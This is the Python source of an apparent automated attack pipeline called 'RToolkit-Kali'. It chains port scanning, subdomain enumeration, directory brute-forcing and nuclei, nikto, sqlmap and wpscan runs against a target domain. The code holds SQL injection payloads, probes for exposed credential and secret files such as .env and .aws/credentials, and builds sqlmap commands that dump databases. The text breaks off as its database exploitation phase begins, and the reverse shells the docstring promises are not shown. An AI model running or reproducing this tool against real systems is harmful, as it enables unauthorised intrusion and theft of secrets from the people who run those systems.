#!/usr/bin/env python3
"""
RToolkit-Kali v3.0 — MASTER RED TEAM TOOL
Pipeline scanning bertingkat:
  1. nmap port scan → service detection → CVE match
  2. subfinder + crt.sh → subdomain discovery
  3. httpx probe → live hosts → whatweb tech detection
  4. dirsearch/ffuf → directory enumeration
  5. paramspider/arjun/x8 → parameter discovery
  6. nuclei/nikto/wpscan/sqlmap → vulnerability scan
  7. Database exploitation (PostgreSQL/MySQL/MSSQL)
  8. Reverse shell + exploit commands + reporting
"""
import os, sys, json, socket, ssl, subprocess, datetime, re, shutil, time, struct, concurrent.futures
from pathlib import Path
from urllib.parse import urlparse, quote

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"
M = "\033[95m"; W = "\033[97m"; N = "\033[0m"; DIM = "\033[2m"; BOLD = "\033[1m"
HAS_REQUESTS = False
try:
    import requests; import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); HAS_REQUESTS = True
except: pass

RESULTS_DIR = Path("kali_results")
CVE_DB = {}
cve_path = Path(__file__).parent / "cve_data.json"
if cve_path.exists():
    try: CVE_DB = json.loads(cve_path.read_text(encoding='utf-8'))
    except: pass

REPORT = {"target":"","timestamp":"","ips":[],"ports":[],"services":[],"cves":[],
    "subdomains":[],"live_urls":[],"technologies":[],"directories":[],"parameters":[],
    "vulnerabilities":[],"exploit_commands":[],"summary":{"total":0,"critical":0,"high":0,"medium":0,"low":0,"info":0}}

def c(text, color): return f"{color}{text}{N}"
SEV_COLORS = {"CRITICAL":R,"HIGH":R,"MEDIUM":Y,"LOW":B,"INFO":C}

RED = R; GREEN = G; YELLOW = Y; CYAN = C; WHITE = W; MAGENTA = M; RESET = N

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{R}
╔══════════════════════════════════════════════════════════════╗
║{W}  ██████╗ ████████╗ ██████╗  ██████╗ ██╗  ██╗██╗     ██╗████████╗{R} ║
║{W}  ██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║ ██╔╝██║     ██║╚══██╔══╝{R} ║
║{W}  ██████╔╝   ██║   ██║   ██║██║   ██║█████╔╝ ██║     ██║   ██║   {R} ║
║{W}  ██╔══██╗   ██║   ██║   ██║██║   ██║██╔═██╗ ██║     ██║   ██║   {R} ║
║{W}  ██║  ██║   ██║   ╚██████╔╝╚██████╔╝██║  ██╗███████╗██║   ██║   {R} ║
║{W}  ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   {R} ║
║{Y}  v3.0 — Pipeline: nmap→subfinder→httpx→dirsearch→paramspider→nuclei→exploit{R} ║
╚══════════════════════════════════════════════════════════════╝{N}""")

def print_table(headers, rows, title=None):
    if not rows: return
    col_widths = [len(h)+2 for h in headers]
    for row in rows:
        for i,cell in enumerate(row):
            clean = re.sub(r'\x1b\[[0-9;]*m','',str(cell))
            col_widths[i] = max(col_widths[i], len(clean)+2)
    sep = '+' + '+'.join('─'*w for w in col_widths) + '+'
    if title: print(f"\n  {c(title,C)}")
    print(f"  {c(sep,DIM)}")
    hdr = ' │ '.join(h.center(col_widths[i]) for i,h in enumerate(headers))
    print(f"  {c('│',DIM)} {hdr} {c('│',DIM)}")
    print(f"  {c(sep,DIM)}")
    for row in rows:
        cells = []
        for i,cell in enumerate(row):
            clean = re.sub(r'\x1b\[[0-9;]*m','',str(cell))
            pad = col_widths[i] - len(clean) - 2
            cells.append(str(cell)+' '*pad)
        print(f"  {c('│',DIM)} {' │ '.join(cells)} {c('│',DIM)}")
    print(f"  {c(sep,DIM)}")

def run_cmd(cmd, timeout=120, desc=""):
    if desc: print(f"    {c('→ '+desc,C)}")
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return proc.stdout, proc.stderr, proc.returncode==0
    except subprocess.TimeoutExpired: return "", "TIMEOUT", False
    except Exception as e: return "", str(e), False

# ====== CVE ENGINE ======
def version_to_cves(service_name, version):
    matches = []
    if not version: return matches
    db_key = service_name.lower().replace(' ', '').replace('-', '')
    if db_key not in CVE_DB: return matches
    for db_ver, vulns in CVE_DB[db_key].items():
        if version == db_ver: matches.extend(vulns)
    return matches

def risk_level(cve_text):
    t = cve_text.lower()
    if any(w in t for w in ['rce','critical','remote code','buffer overrun','code injection','heap overflow']): return "CRITICAL"
    if any(w in t for w in ['high','privesc','privilege escalation','ssrf','traversal','memory corruption','xss']): return "HIGH"
    if any(w in t for w in ['medium','dos','info leak','spoof','bypass']): return "MEDIUM"
    return "LOW"

def add_cve(port, svc, software, version, cve_text):
    sev = risk_level(cve_text)
    if not any(cv['cve']==cve_text for cv in REPORT["cves"]):
        REPORT["cves"].append({"port":port,"service":svc,"software":software,"version":version,"cve":cve_text,"severity":sev})
        REPORT["summary"][sev.lower()] = REPORT["summary"].get(sev.lower(),0)+1
        REPORT["summary"]["total"] += 1

# ====== SOCKET PROBES ======
PROBE_PORTS = [21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,587,
    636,993,995,1080,1433,1521,2049,2083,2181,2375,2376,3000,3001,3306,3389,
    3632,4444,5000,5432,5555,5800,5900,5901,5985,5986,6379,6443,7000,7070,
    8000,8001,8008,8080,8081,8090,8443,8880,8888,9000,9001,9042,9092,9094,
    9200,9300,9418,9999,10000,11211,27017,27018,50070,50075,50090]

def port_scan(ip, ports=None):
    if ports is None: ports = PROBE_PORTS
    open_ports = []
    def scan(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.5)
            if s.connect_ex((ip,p)) == 0: open_ports.append(p)
            s.close()
        except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
        ex.map(scan, ports)
    return sorted(open_ports)

def probe_http(ip, port, use_ssl=False):
    r = {"port":port,"protocol":"https" if use_ssl else "http","server":"","powered":"","techs":{},"title":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
        if use_ssl:
            ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            s = ctx.wrap_socket(s)
        s.connect((ip,port))
        s.send(("GET / HTTP/1.0\r\nHost: "+ip+":"+str(port)+"\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n").encode())
        resp = b""
        while True:
            try:
                c2 = s.recv(4096)
                if not c2: break
                resp += c2
            except: break
        s.close()
        he = resp.find(b"\r\n\r\n")
        if he == -1: return r
        hdr = resp[:he].decode('utf-8',errors='replace')
        body = resp[he+4:].decode('utf-8',errors='replace')
        headers = {}
        for line in hdr.split('\r\n')[1:]:
            if ':' in line:
                k,v = line.split(':',1); headers[k.strip().lower()] = v.strip()
        r["server"] = headers.get("server","")
        r["powered"] = headers.get("x-powered-by","")
        tm = re.search(r'<title>([^<]+)</title>', body, re.I)
        if tm: r["title"] = tm.group(1).strip()[:100]
        r["banner"] = body[:300]
        srv = r["server"].lower()
        if "apache" in srv:
            m = re.search(r'Apache[ /](\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if m: r["techs"]["apache"] = m.group(1)
        if "nginx" in srv:
            m = re.search(r'nginx[ /]?(\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if m: r["techs"]["nginx"] = m.group(1)
        if "openresty" in srv:
            m = re.search(r'openresty[ /]?(\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if m: r["techs"]["openresty"] = m.group(1)
        if "php" in r["powered"].lower():
            m = re.search(r'PHP[ /](\d+\.\d+(?:\.\d+)?)', r["powered"], re.I)
            if m: r["techs"]["php"] = m.group(1)
    except: pass
    return r

def probe_ssh(ip, port=22):
    r = {"version":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4)
        s.connect((ip,port))
        b = s.recv(1024).decode('utf-8',errors='replace').strip(); s.close()
        r["banner"] = b[:300]
        m = re.search(r'SSH-\d+\.\d+-([^\s]+)', b)
        if m: r["version"] = m.group(1)
    except: pass
    return r

def probe_pgsql(ip, port=5432):
    r = {"version":"","auth_method":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(4)
        s.connect((ip,port))
        username = b"postgres\x00"
        params = b"user\x00"+username+b"database\x00postgres\x00\x00"
        length = struct.pack('!I',8+4+len(params))
        s.send(b'\x00\x03\x00\x00'+length[1:]+params)
        resp = s.recv(4096); s.close()
        if len(resp)<5: return r
        pos = 0
        while pos < len(resp):
            if pos+5>len(resp): break
            mtype = chr(resp[pos]); mlen = struct.unpack('!I',resp[pos+1:pos+5])[0]
            if mtype == 'R' and pos+5<len(resp):
                auth_type = struct.unpack('!I',resp[pos+5:pos+9])[0]
                auth_names = {0:"OK",2:"KerberosV5",3:"CleartextPassword",5:"SCM Credential",6:"GSS",9:"SASL"}
                r["auth_method"] = auth_names.get(auth_type,f"Type_{auth_type}")
            if mtype == 'S' and pos+5<len(resp):
                chunk = resp[pos+5:pos+mlen]
                parts = chunk.split(b'\x00')
                for i,p in enumerate(parts):
                    if p == b'server_version' and i+1<len(parts):
                        r["version"] = parts[i+1].decode('utf-8',errors='replace')
            pos += mlen
    except: pass
    return r

def probe_mysql(ip, port=3306):
    r = {"version":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(4)
        s.connect((ip,port)); resp = s.recv(1024); s.close()
        if len(resp)>=5:
            end = resp.find(b'\x00',5)
            if end>5: r["version"] = resp[5:end].decode('utf-8',errors='replace')
    except: pass
    return r

def probe_banner(ip, port):
    r = {"banner":""}
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(3)
        s.connect((ip,port))
        try: s.send(b"\r\n")
        except: pass
        try:
            b2 = s.recv(1024).decode('utf-8',errors='replace').strip()
            if b2: r["banner"] = b2[:300]
        except: pass
        s.close()
    except: pass
    return r

# ====== PHASE 1: RECONNAISSANCE (PIPELINE) ======
def phase1_nmap(domain):
    """Phase 1a: Deep nmap port scan + version detection."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1a: RECON — Nmap Port Scan',BOLD)}")
    print(f"{c('='*65,Y)}")
    tools = {}
    for t in ["nmap","subfinder","httpx","whatweb","dirsearch","ffuf","gobuster","nuclei","nikto","sqlmap","wpscan","arjun","x8","paramspider","katana"]:
        tools[t] = shutil.which(t) is not None
    target_ip = ""
    try:
        target_ip = socket.gethostbyname(domain); REPORT["ips"].append(target_ip)
    except:
        target_ip = domain
    print(f"  IP: {c(target_ip,W)}")
    t_icons = ""
    for t in ["nmap","subfinder","httpx","whatweb","nuclei","sqlmap","dirsearch","ffuf"]:
        t_icons += c("✓",G) if tools[t] else c("✗",R)
        t_icons += t[:3]+" "
    print(f"  Tools: {t_icons}")

    # Deep nmap scan — all ports + service version + scripts
    if tools["nmap"]:
        print(f"\n  {c('[1a] Nmap Deep Scan — top 1000 ports, service detection, scripts',G)}")
        stdout,_,ok = run_cmd(
            f"nmap -sS -sV -sC -T4 --top-ports 1000 --open -oN {RESULTS_DIR}/nmap_deep.txt {target_ip}",
            600, "nmap SYN+version+script scan (1000 ports)")
        if ok:
            for line in stdout.split('\n'):
                m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)',line)
                if m: REPORT["ports"].append(f"{m.group(1)}/tcp ({m.group(2)})")
        # Second pass — full port scan (quick, min-rate agar cepat)
        print(f"\n  {c('[1a] Nmap Full Port Scan — all 65535 ports (fast)',G)}")
        stdout,_,_ = run_cmd(
            f"nmap -sS -T4 -p- --open -oN {RESULTS_DIR}/nmap_full.txt {target_ip}",
            600, "nmap full port scan (all 65535)")
        # Show results
        nfile = RESULTS_DIR/"nmap_deep.txt"
        if nfile.exists():
            content = nfile.read_text()
            hosts_up = len(re.findall(r'Host is up',content))
            os_detected = re.findall(r'OS details: (.+)',content)
            port_lines = []
            for line in content.split('\n'):
                m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)\s+(.+)$',line)
                if m: port_lines.append([m.group(1),m.group(2),m.group(3)[:40]])
            if port_lines:
                print_table(["Port","Service","Version"],port_lines[:20],f"[NMAP OPEN PORTS ({len(port_lines)} total)]")
                if len(port_lines)>20: print(f"    ... +{len(port_lines)-20} more")
            if os_detected: print(f"  OS: {c(os_detected[0],W)}")
            print(f"  Hosts up: {hosts_up}")
    else:
        print(f"\n  {c('[1a] Nmap not found — using pure Python port scan',Y)}")
        open_ports = port_scan(target_ip)
        print(f"  Found {c(len(open_ports),W)} open ports")
        if open_ports:
            pt = [[str(p),socket.getservbyport(p,'tcp') if p<1024 else ""] for p in open_ports[:25]]
            print_table(["Port","Service"],pt,"[OPEN PORTS]")
            # Auto-scan extra ports
            if len(open_ports)>25:
                extra = open_ports[25:]
                pt2 = [[str(p),""] for p in extra]
                print_table(["Port","Service"],pt2,"[MORE OPEN PORTS]")

    return target_ip, tools

def phase1_banner_grab(domain, target_ip, open_ports=None):
    """Phase 1b: Banner grabbing + version detection + CVE matching on open ports."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1b: RECON — Banner Grab + CVE Detection',BOLD)}")
    print(f"{c('='*65,Y)}")
    if not open_ports:
        open_ports = port_scan(target_ip)
    if not open_ports:
        print(f"  {c('No open ports found',Y)}")
        return []

    services = []
    for port in open_ports:
        svc = {"port":port,"protocol":"","version":"","techs":{},"banner":"","title":""}
        try:
            if port in [80,8000,8008,8080,8090,8888,9000,3000,3001,5000,8081,8880,7000]:
                info = probe_http(ip=target_ip, port=port, use_ssl=False); svc.update(info)
            elif port in [443,8443,9443,6443]:
                info = probe_http(ip=target_ip, port=port, use_ssl=True); svc.update(info)
            elif port == 22:
                info = probe_ssh(ip=target_ip); svc["protocol"]="ssh"; svc["version"]=info["version"]; svc["banner"]=info["banner"]
            elif port == 5432:
                info = probe_pgsql(ip=target_ip); svc["protocol"]="postgresql"; svc["version"]=info["version"]; svc["banner"]="Auth: "+info["auth_method"]
            elif port == 3306:
                info = probe_mysql(ip=target_ip); svc["protocol"]="mysql"; svc["version"]=info["version"]; svc["banner"]=info["banner"]
            elif port in [6379]:
                info = probe_banner(ip=target_ip, port=port); svc["protocol"]="redis"; svc["banner"]=info["banner"]
            elif port in [27017,27018]:
                svc["protocol"]="mongodb"
            else:
                info = probe_banner(ip=target_ip, port=port); svc["banner"]=info["banner"][:50] if info["banner"] else ""
        except: pass
        services.append(svc)
    REPORT["services"] = services

    svc_table = []
    for s in services:
        ver = s.get("version","") or "-"
        tech_str = "; ".join(f"{k}={v}" for k,v in s.get("techs",{}).items()) or s.get("banner","")[:40]
        svc_table.append([str(s["port"]),s.get("protocol","-"),ver,tech_str,s.get("title","")[:30]])
    print_table(["Port","Proto","Version","Detail","Title"],svc_table,"[BANNER GRAB RESULTS]")

    # CVE matching dari banner
    cve_count = 0
    for s in services:
        for app, ver in s.get("techs",{}).items():
            if not ver: continue
            for cv in version_to_cves(app, ver):
                add_cve(s["port"],s.get("protocol",""),app,ver,cv); cve_count+=1
        if s.get("protocol")=="ssh" and s.get("version"):
            for cv in version_to_cves("openssh", s["version"]):
                add_cve(s["port"],"ssh","OpenSSH",s["version"],cv); cve_count+=1
    if REPORT["cves"]:
        ct = [[str(cv["port"]),cv["service"],cv["software"],cv["version"],
               c(cv["cve"][:55],SEV_COLORS.get(cv["severity"],W)),c(cv["severity"],SEV_COLORS.get(cv["severity"],W))]
              for cv in REPORT["cves"]]
        print_table(["Port","Svc","Software","Ver","CVE","Sev"],ct[:30],f"[CVEs FOUND ({len(REPORT['cves'])} total)]")
    else:
        print(f"  {c('No CVEs matched from banners',G)}")
    return services

def phase1_subdomains(domain, tools):
    """Phase 1c: Subdomain enumeration via subfinder + crt.sh."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1c: RECON — Subdomain Enumeration',BOLD)}")
    print(f"{c('='*65,Y)}")
    all_subs = set()
    all_subs.add(domain)

    # Subfinder (Kali)
    if tools.get("subfinder"):
        print(f"  {c('[1c] Subfinder passive subdomain enumeration',G)}")
        stdout,_,ok = run_cmd(f"subfinder -d {domain} -silent -o {RESULTS_DIR}/subdomains.txt 2>/dev/null",120)
        if ok and stdout:
            for s in stdout.strip().split('\n'):
                s=s.strip()
                if s: all_subs.add(s)
            print(f"    {c('subfinder',G)}: {len(all_subs)-1} subdomains")

    # crt.sh (pure Python fallback)
    print(f"  {c('[1c] crt.sh certificate transparency search',G)}")
    if HAS_REQUESTS:
        try:
            r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15, verify=False)
            if r.status_code==200:
                for entry in r.json():
                    for d in entry.get("name_value","").split("\n"):
                        d = d.strip().lstrip('*.').lstrip('*')
                        if d: all_subs.add(d)
                print(f"    {c('crt.sh',G)}: {len(all_subs)} unique domains")
        except: pass

    # DNS lookup
    print(f"  {c('[1c] DNS A record resolution',G)}")
    live_subs = {}
    for sub in list(all_subs):
        try:
            ip = socket.gethostbyname(sub)
            live_subs[sub] = ip
            if ip not in REPORT["ips"]: REPORT["ips"].append(ip)
        except: pass
    all_subs = set(live_subs.keys())
    all_subs.add(domain)
    REPORT["subdomains"] = list(all_subs)

    sub_table = [[s, live_subs.get(s,"")] for s in sorted(all_subs)[:30]]
    print_table(["Subdomain","IP"],sub_table,f"[SUBDOAINS ({len(all_subs)} total)]")
    if len(all_subs)>30: print(f"    ... +{len(all_subs)-30} more")
    return list(all_subs)

def phase1_httpx(domain, all_subs, tools):
    """Phase 1d: httpx probe untuk menemukan live web hosts."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1d: RECON — httpx Live Host Probing',BOLD)}")
    print(f"{c('='*65,Y)}")
    live_urls = set()
    live_urls.add(f"https://{domain}")
    live_urls.add(f"http://{domain}")

    # Katana/httpx
    if tools.get("katana"):
        print(f"  {c('[1d] Katana crawling for endpoints',G)}")
        run_cmd(f"katana -u https://{domain} -silent -o {RESULTS_DIR}/katana.txt 2>/dev/null",180)
        kfile = RESULTS_DIR/"katana.txt"
        if kfile.exists():
            for line in kfile.read_text().strip().split('\n'):
                line=line.strip()
                if line: live_urls.add(line)

    if tools.get("httpx") and all_subs:
        sub_file = RESULTS_DIR/"subdomains.txt"
        with open(sub_file,'w') as f:
            for s in all_subs: f.write(s+'\n')
        print(f"  {c('[1d] httpx probing',G)}")
        stdout,_,_ = run_cmd(
            f"httpx -l {sub_file} -silent -status-code -title -tech-detect -o {RESULTS_DIR}/httpx.txt 2>/dev/null",180)
        if stdout:
            for line in stdout.strip().split('\n'):
                parts = line.split()
                if parts:
                    url = parts[0]
                    live_urls.add(url)
                    # Extract technology
                    if "[" in line:
                        techs = re.findall(r'\[([^\]]+)\]', line)
                        for t in techs: REPORT["technologies"].append(t)

    # Pure Python fallback — coba HTTP/HTTPS
    print(f"  {c('[1d] Python HTTP probe',G)}")
    for sub in all_subs[:20]:
        for proto in ["https","http"]:
            try:
                s = socket.socket(); s.settimeout(1)
                s.connect((sub, 443 if proto=="https" else 80)); s.close()
                live_urls.add(f"{proto}://{sub}")
            except: pass

    REPORT["live_urls"] = list(live_urls)
    live_table = [[u[:80],"✓"] for u in sorted(live_urls)[:20]]
    print_table(["URL","Status"],live_table,f"[LIVE HOSTS ({len(live_urls)} total)]")
    if len(live_urls)>20: print(f"    ... +{len(live_urls)-20} more")

    # whatweb pada live host pertama
    if tools.get("whatweb") and live_urls:
        main_url = f"https://{domain}" if f"https://{domain}" in live_urls else list(live_urls)[0]
        print(f"\n  {c('[1d] WhatWeb technology detection',G)}")
        stdout,_,_ = run_cmd(f"whatweb -a 3 --log-json={RESULTS_DIR}/whatweb.json {main_url} 2>/dev/null",120)
        if stdout:
            for line in stdout.split('\n'):
                m = re.findall(r'(\w[\w+]*)\[([^\]]+)\]',line)
                for tname,tver in m:
                    tech_entry = f"{tname}: {tver}"
                    if tech_entry not in REPORT["technologies"]: REPORT["technologies"].append(tech_entry)
    return list(live_urls)

# ====== PHASE 2: DIRECTORY + PARAMETER ======
def phase2_discovery(live_urls, tools):
    """Phase 2: Directory + Parameter discovery pada setiap live host."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 2: DIRECTORY + PARAMETER DISCOVERY',BOLD)}")
    print(f"{c('='*65,Y)}")
    all_dirs = 0
    all_params = 0

    for url in live_urls[:5]:
        domain = url.replace('https://','').replace('http://','').split('/')[0]
        print(f"\n  {c('Scanning:',C)} {c(url,W)}")

        # Dirsearch
        if tools.get("dirsearch"):
            print(f"  {c('[2a] Dirsearch directory bruteforce',G)}")
            run_cmd(
                f"dirsearch -u {url} -w /usr/share/wordlists/dirb/common.txt "
                f"-e php,asp,aspx,txt,conf,db,sql,bak,zip,tar,log,json -t 50 "
                f"--format plain -o {RESULTS_DIR}/dirsearch_{domain}.txt 2>/dev/null",300)
            dfile = RESULTS_DIR/f"dirsearch_{domain}.txt"
            if dfile.exists():
                for line in dfile.read_text().split('\n'):
                    if any(s in line for s in ['200','301','302','401','403']):
                        all_dirs += 1

        # Ffuf
        if tools.get("ffuf"):
            print(f"  {c('[2a] Ffuf content discovery',G)}")
            run_cmd(
                f"ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt "
                f"-t 80 -c -o {RESULTS_DIR}/ffuf_{domain}.json -of json -s 2>/dev/null",300)

        # Pure Python dir bruteforce (fallback / additional)
        print(f"  {c('[2a] Python directory check (100 paths)',G)}")
        dirs_wordlist = ["admin","login","wp-admin","wp-content","uploads","files",
            "backup","db",".git/HEAD",".env","config","robots.txt","sitemap.xml",
            "phpinfo.php","info.php","api","api/v1","graphql","swagger","docs",
            "css","js","images","assets","static","vendor","install","setup",
            "error","logs","cache","tmp","blog","user","account","register",
            "search","cart","download","ajax","includes","themes","templates",
            "server-status","cgi-bin","xmlrpc.php","administrator","phpmyadmin",
            "webdav",".git/config","Dockerfile",".aws/credentials","package.json",
            "composer.json","requirements.txt","wp-json","wp-login.php",
            "wp-cron.php","index.php","index.html",".htaccess","dump.sql",
            "backup.sql","config.php","database.yml",".env.example",
            "storage/logs/laravel.log","wp-config.php.bak","wp-content/debug.log"]
        if HAS_REQUESTS:
            for path in dirs_wordlist:
                try:
                    r = requests.get(f"{url.rstrip('/')}/{path}", timeout=2, allow_redirects=False, verify=False,
                                   headers={'User-Agent':'Mozilla/5.0'})
                    if r.status_code in [200,301,302,401,403,500,405]:
                        REPORT["directories"].append({"url":f"{url}/{path}","status":r.status_code})
                except: pass

        # ParamSpider
        if tools.get("paramspider"):
            print(f"  {c('[2b] ParamSpider parameter crawling',G)}")
            run_cmd(
                f"paramspider -d {domain} --level high -o {RESULTS_DIR}/params_{domain}.txt 2>/dev/null",180)
            pfile = RESULTS_DIR/f"params_{domain}.txt"
            if pfile.exists():
                for line in pfile.read_text().split('\n'):
                    line=line.strip()
                    if line:
                        parsed = urlparse(line)
                        if parsed.query:
                            for param in parsed.query.split('&'):
                                pname = param.split('=')[0]
                                if pname not in REPORT["parameters"]: REPORT["parameters"].append(pname)
                                all_params += 1

        # Arjun
        if tools.get("arjun"):
            print(f"  {c('[2b] Arjun parameter discovery',G)}")
            run_cmd(f"arjun -u {url} --get --passive -oJ 2>/dev/null",180)

    dir_table = [[str(len(REPORT["directories"])),str(len(REPORT["parameters"]))]]
    print_table(["Directories","Parameters"],dir_table,"[DISCOVERY SUMMARY]")

# ====== PHASE 3: VULNERABILITY SCAN ======
SENSITIVE_PATHS = ["/.env","/.git/config","/.git/HEAD","/admin/.env","/phpinfo.php",
    "/wp-content/debug.log","/wp-config.php.bak","/config.php","/dump.sql","/backup.sql",
    "/.htaccess","/server-status","/.aws/credentials","/Dockerfile","/docker-compose.yml",
    "/terraform.tfstate","/storage/logs/laravel.log","/composer.json","/package.json",
    "/admin/","/backup/","/db/","/sql/","/.svn/entries","/crossdomain.xml",
    "/clientaccesspolicy.xml","/web.config","/phpinfo.php"]

def phase3_vuln_scan(live_urls, tools):
    """Phase 3: Vulnerability scanning pada setiap live host — nuclei → nikto → file exposure → SQLi → wpscan."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 3: VULNERABILITY SCANNING',BOLD)}")
    print(f"{c('='*65,Y)}")

    for url in live_urls[:5]:
        domain = url.replace('https://','').replace('http://','').split('/')[0]
        print(f"\n  {c('▸ Target:',C)} {c(url,W)}")

        # 3a. Nuclei — bertingkat berdasarkan severity
        if tools.get("nuclei"):
            for sev in ["critical","high","medium"]:
                print(f"  {c(f'[3a] Nuclei {sev.upper()}',G)}")
                stdout,_,ok = run_cmd(
                    f"nuclei -u {url} -severity {sev} -silent -json -o {RESULTS_DIR}/nuclei_{domain}_{sev}.json 2>/dev/null",
                    300)
                nfile = RESULTS_DIR/f"nuclei_{domain}_{sev}.json"
                if nfile.exists():
                    for line in nfile.read_text().strip().split('\n'):
                        try:
                            d = json.loads(line)
                            vu = d.get("matched-at",d.get("url",""))
                            vn = d.get("info",{}).get("name","")
                            vs = d.get("info",{}).get("severity","info").upper()
                            if not any(v["url"]==vu and v["name"]==vn for v in REPORT["vulnerabilities"]):
                                REPORT["vulnerabilities"].append({
                                    "url":vu,"name":vn,"severity":vs,"source":"nuclei",
                                    "exploit_cmd":f"curl -s '{vu}'"})
                        except: pass

        # 3b. Nikto
        if tools.get("nikto"):
            print(f"  {c('[3b] Nikto web server scan',G)}")
            run_cmd(f"nikto -h {url} -Format json -output {RESULTS_DIR}/nikto_{domain}.json 2>/dev/null",300)
            nfile = RESULTS_DIR/f"nikto_{domain}.json"
            if nfile.exists():
                try:
                    data = json.loads(nfile.read_text())
                    items = data if isinstance(data,list) else data.get("items",[])
                    for item in items:
                        if isinstance(item,dict):
                            msg = item.get("message","")[:80]
                            if msg and not any(v["url"]==item.get("url",url) and v["name"]==msg for v in REPORT["vulnerabilities"]):
                                REPORT["vulnerabilities"].append({
                                    "url":item.get("url",url),"name":msg,"severity":"MEDIUM","source":"nikto",
                                    "exploit_cmd":"# Check manually"})
                except: pass

        # 3c. Sensitive file exposure
        print(f"  {c('[3c] Sensitive file check',G)}")
        if HAS_REQUESTS:
            for path in SENSITIVE_PATHS:
                try:
                    r = requests.get(f"{url.rstrip('/')}{path}", timeout=3, verify=False, allow_redirects=False,
                                   headers={"User-Agent":"Mozilla/5.0"})
                    if r.status_code in [200,401,403]:
                        body_low = r.text.lower()
                        if "request rejected" in body_low and len(r.text)<500: continue
                        sev = "CRITICAL" if r.status_code==200 else "HIGH"
                        REPORT["vulnerabilities"].append({
                            "url":f"{url}{path}","name":f"Sensitive File: {path}",
                            "severity":sev,"source":"file_check",
                            "exploit_cmd":f"curl -s '{url}{path}'"})
                        sz = str(len(r.text))
                        print(f"    {c(path+' ('+sz+'B)',R if r.status_code==200 else Y)}")
                except: pass

        # 3d. SQL injection detection
        print(f"  {c('[3d] SQL injection detection',G)}")
        sqli_payloads = ["'","\"","')","' OR '1'='1","' OR 1=1 -- -","' AND SLEEP(3) -- -"]
        sqli_errors = {"MySQL":[r"SQL syntax.*MySQL",r"#1064"],"PostgreSQL":[r"PostgreSQL.*ERROR",r"PSQLException"],"MSSQL":[r"SQL Server.*Driver",r"Unclosed quotation"]}
        if HAS_REQUESTS:
            params = ["id","page","q","s","search","cat","file","load","action","exec","cmd","order","sort","limit","offset","dir"]
            for param in params:
                for payload in sqli_payloads:
                    try:
                        test_url = re.sub(f'({re.escape(param)}=)[^&]*', f'\\1{quote(payload)}', url) if '?' in url else f"{url}?{param}={quote(payload)}"
                        r = requests.get(test_url, timeout=3, verify=False)
                        for db,pats in sqli_errors.items():
                            for pat in pats:
                                if re.search(pat,r.text,re.I):
                                    REPORT["vulnerabilities"].append({
                                        "url":f"{url}?{param}=1","name":f"SQLi via {param} ({db})",
                                        "severity":"CRITICAL","source":"sqli_check",
                                        "exploit_cmd":f"sqlmap -u '{url}?{param}=1' --batch --dbs"})
                                    print(f"    {c('⚠ SQLi via: '+param,R)}")
                                    break
                            else: continue
                            break
                    except: pass

        # SQLMap (Kali)
        if tools.get("sqlmap"):
            print(f"  {c('[3d] SQLMap automated scan',G)}")
            for param in ["id","page","q","s","search","cat"]:
                run_cmd(f"sqlmap -u '{url}?{param}=1' --batch --level 2 --risk 1 --output-dir={RESULTS_DIR}/sqlmap_{domain} 2>/dev/null",180)

        # 3e. WPScan
        has_wp = any("WordPress" in t for t in REPORT["technologies"]) or any("wp" in u.lower() for u in REPORT["directories"]) or any("wp" in path.get("url","").lower() for path in REPORT["vulnerabilities"])
        if tools.get("wpscan") and has_wp:
            print(f"  {c('[3e] WPScan WordPress',G)}")
            run_cmd(f"wpscan --url {url} --no-update --format json -o {RESULTS_DIR}/wpscan_{domain}.json 2>/dev/null",300)

    # Tampilkan ringkasan vuln
    vuln_table = []
    for v in REPORT["vulnerabilities"]:
        sev = v.get("severity","INFO").upper()
        scar = SEV_COLORS.get(sev,W)
        vuln_table.append([c(v["name"][:50],scar),c(sev,scar),v.get("url","")[:50],v.get("source","")])
    if vuln_table:
        print_table(["Name","Sev","URL","Source"],vuln_table[:30],f"[VULNS FOUND ({len(REPORT['vulnerabilities'])} total)]")

# ====== PHASE 4: DATABASE EXPLOITATION ======
def phase4_db(domain):
    """Phase 4: Database exploitation — PostgreSQL/MySQL/MSSQL."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 4: DATABASE EXPLOITATION',BOLD)}")
    print(f"{c('='*65,Y)}")

    db_services = [s for s in REPORT["services"] if s["protocol"] in ["postgresql","mysql","mssql"]]
    if not db_services:
        # Fallback: cek dari port scan
        for p in REPORT["ports"]:
            if "5432" in p: db_services.append({"protocol":"postgresql","port":5432})
